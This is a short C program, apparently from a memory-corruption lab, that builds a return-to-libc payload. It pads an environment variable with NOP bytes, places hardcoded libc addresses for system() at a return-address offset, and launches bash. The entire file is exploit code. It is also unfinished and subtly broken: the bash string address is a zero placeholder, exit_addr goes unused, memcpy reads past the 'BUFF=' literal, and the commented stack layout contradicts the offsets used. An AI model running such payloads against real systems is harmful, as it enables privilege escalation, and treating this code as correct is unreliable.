#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char system_addr[] = "\x20\x83\xa5\xf7\xff\x7f"; //0x7ffff7a58320
char exit_addr[] = "\xe0\xe0\xa4\xf7\xff\x7f"; //0x7ffff7a4e0e0
char bash_addr[] = "\x00\x00\x00\x00\x00\x00"; //dont know this for now!

int main()
{

	char buffer[200];//bufer(80) EBP(4) RET(4) 4,4 4,4(padding)
	
	memset(buffer,0x90, 200);//fill entire buffer
	memcpy(buffer, "BUFF=", 8);//naming environment variable as BUFF
	memcpy(buffer+104, system_addr, 8);
	memcpy(buffer+120, bash_addr, 8);
	memcpy(buffer+128, "\x00\x00\x00\x00\x00\x00", 8);
	
	putenv(buffer);
	system("/bin/bash");
	
	return 1;
	
}
